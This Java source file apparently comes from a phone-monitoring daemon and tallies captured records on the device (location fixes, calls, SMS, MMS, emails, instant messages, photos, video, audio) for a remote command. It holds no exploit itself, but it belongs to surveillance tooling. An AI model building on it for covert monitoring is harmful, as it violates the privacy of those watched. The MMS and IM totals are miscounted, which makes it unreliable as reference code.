package com.fx.maind.command.processor;

import com.fx.maind.ref.Customization;
import com.fx.maind.ref.DatabaseRecords;
import com.vvt.base.FxEventType;
import com.vvt.daemon.appengine.AppEngine;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.eventrepository.eventresult.EventCountInfo;
import com.vvt.events.FxEventDirection;
import com.vvt.logger.FxLog;

public class RemoteGetDatabaseRecordsProcessor {
	
	private static final String TAG = "RemoteGetDatabaseRecordsProcessor";
	private static final boolean LOGE = Customization.ERROR;
	
	private AppEngine mAppEngine;
	
	public RemoteGetDatabaseRecordsProcessor(AppEngine appEngine) {
		mAppEngine = appEngine;
	}
	
	public DatabaseRecords process() {
		DatabaseRecords dbRecords = new DatabaseRecords();
		
		FxEventRepository eventRepository = mAppEngine.getEventRepository();
		
		EventCountInfo eventCountInfo = null;
		try {
			eventCountInfo  = eventRepository.getCount();
		}
		catch(Throwable t) {
			if (LOGE) FxLog.e(TAG, String.format("process # Error: %s", t));
			return new DatabaseRecords();
		}
		
		if (eventCountInfo != null) {
			
			int countTotal = 0;
				
			for (FxEventType eventType : FxEventType.values()) {
				if(eventType == FxEventType.LOCATION) {
					int locationEventCount = eventCountInfo.count(eventType);
					countTotal += locationEventCount;
					dbRecords.setGPS(locationEventCount);
				}
				else if (eventType == FxEventType.CALL_LOG) {
					int incomingCallCount = 0;
					incomingCallCount = eventCountInfo.count(eventType, FxEventDirection.IN);
					countTotal += incomingCallCount;

					int missedCallCount = 0;
					missedCallCount = eventCountInfo.count(eventType, FxEventDirection.MISSED_CALL);
					countTotal += missedCallCount;

					int outgoingCallCount = 0;
					outgoingCallCount = eventCountInfo.count(eventType, FxEventDirection.OUT);
					countTotal += outgoingCallCount;
					
					dbRecords.setIncomingCall(incomingCallCount);
					dbRecords.setMissedCall(missedCallCount);
					dbRecords.setOutgoingCall(outgoingCallCount);
				}
				else if (eventType == FxEventType.MAIL) {
					int inEMailCount = 0;
					inEMailCount = eventCountInfo.count(eventType, FxEventDirection.IN);
					countTotal += inEMailCount;
					dbRecords.setIncomingEmail(inEMailCount);
					
					int outEMailCount = 0;
					outEMailCount = eventCountInfo.count(eventType, FxEventDirection.OUT);
					countTotal += outEMailCount;
					dbRecords.setOutgoingEmail(outEMailCount);
				}
				else if (eventType == FxEventType.MMS) {
					int inMMSCount = 0;
					inMMSCount = eventCountInfo.count(eventType, FxEventDirection.IN);
					dbRecords.setIncomingMMS(inMMSCount);
					countTotal += inMMSCount;

					int outMMSCount = 0;
					inMMSCount = eventCountInfo.count(eventType, FxEventDirection.OUT);
					dbRecords.setOutgoingMMS(inMMSCount);
					countTotal += outMMSCount;
				}
				else if (eventType == FxEventType.SMS) {
					int inSMSCount = 0;
					inSMSCount = eventCountInfo.count(eventType, FxEventDirection.IN);
					dbRecords.setIncomingSMS(inSMSCount);
					countTotal += inSMSCount;
					
					int outSMSCount = 0;
					outSMSCount = eventCountInfo.count(eventType, FxEventDirection.OUT);
					dbRecords.setOutgoingSMS(outSMSCount);
					countTotal += outSMSCount;
				}
				else if (eventType == FxEventType.SYSTEM) {
					int in = eventCountInfo.count(eventType, FxEventDirection.IN);
					countTotal +=in;
							
					int out = eventCountInfo.count(eventType, FxEventDirection.OUT);
					countTotal += out;
					
					dbRecords.setSystem(in + out);
				}
				else if (eventType == FxEventType.CAMERA_IMAGE) {
					int cameraThumbnailImageCount = 0;
					cameraThumbnailImageCount = eventCountInfo.count(eventType);
					countTotal += cameraThumbnailImageCount;
					dbRecords.setImage(cameraThumbnailImageCount);
				}
				else if (eventType == FxEventType.VIDEO_FILE) {
					int videoFileThumbnailCount = 0;
					videoFileThumbnailCount = eventCountInfo.count(eventType);
					countTotal +=videoFileThumbnailCount;
					dbRecords.setVideo(videoFileThumbnailCount);
				}
				else if (eventType == FxEventType.AUDIO_FILE) {
					int audioFileThumbnailCount = 0;
					audioFileThumbnailCount  = eventCountInfo.count(eventType);
					countTotal +=audioFileThumbnailCount;
					dbRecords.setAudio(audioFileThumbnailCount);
				}
				else if (eventType == FxEventType.WALLPAPER) {
					int wallpaperThumbnailCount  = 0;
					wallpaperThumbnailCount = eventCountInfo.count(eventType); 
					countTotal +=wallpaperThumbnailCount;
					dbRecords.setWallpaper(wallpaperThumbnailCount);
				}
				else if (eventType == FxEventType.IM) {
					int incomingIM = eventCountInfo.count(eventType, FxEventDirection.IN);
					dbRecords.setIncomingIM(incomingIM);
					int outgoingIM = eventCountInfo.count(eventType, FxEventDirection.OUT);
					dbRecords.setOutgoingIM(outgoingIM);
				}
			}
			
			dbRecords.setTotalEvents(countTotal);
		}
		
		return dbRecords;
	}
}
